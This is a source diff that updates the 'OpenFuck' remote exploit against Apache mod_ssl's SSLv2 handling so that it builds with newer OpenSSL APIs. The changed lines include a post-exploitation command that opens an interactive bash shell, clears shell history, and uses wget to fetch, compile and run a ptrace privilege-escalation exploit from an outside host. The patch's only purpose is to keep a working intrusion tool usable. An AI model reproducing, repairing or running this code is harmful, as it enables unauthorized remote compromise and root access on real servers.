@@ -1,5 +1,4 @@
 /*
- * E-DB Note: Updating OpenFuck Exploit ~ http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
  *
  * OF version r00t VERY PRIV8 spabam
  * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
@@ -21,6 +20,15 @@
 #include <openssl/rsa.h>
 #include <openssl/x509.h>
 #include <openssl/evp.h>
+
+#include <openssl/rc4.h>
+#include <openssl/md5.h>
+#define SSL2_MT_ERROR 0
+#define SSL2_MT_CLIENT_FINISHED 3
+#define SSL2_MT_SERVER_HELLO 4
+#define SSL2_MT_SERVER_VERIFY 5
+#define SSL2_MT_SERVER_FINISHED 6
+#define SSL2_MAX_CONNECTION_ID_LENGTH 16
 
 /* update this if you add architectures */
 #define MAX_ARCH 138
@@ -660,7 +668,7 @@ typedef struct {
 } ssl_conn;
 
 #define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
-#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
+#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
 
 long getip(char *hostname) {
 	struct hostent *he;
@@ -958,7 +966,8 @@ void send_client_hello(ssl_conn *ssl)
 void get_server_hello(ssl_conn* ssl)
 {
 	unsigned char buf[BUFSIZE];
-	unsigned char *p, *end;
+	//unsigned char *p, *end;
+	const unsigned char *p, *end;
 	int len;
 	int server_version, cert_length, cs_length, conn_id_length;
 	int found;
@@ -1066,13 +1075,15 @@ void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int
 		exit(1);
 	}
 
-	if (pkey->type != EVP_PKEY_RSA) {
+	//if (pkey->type != EVP_PKEY_RSA) {
+	if (EVP_PKEY_get1_RSA(pkey) == NULL) {
 		printf("send client master key: The public key in the server certificate is not a RSA key\n");
 		exit(1);
 	}
 
 	/* Encrypt the client master key with the server public key and put it in the packet */
-	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
+	//encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
+	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
 	if (encrypted_key_length <= 0) {
 		printf("send client master key: RSA encryption failure\n");
 		exit(1);
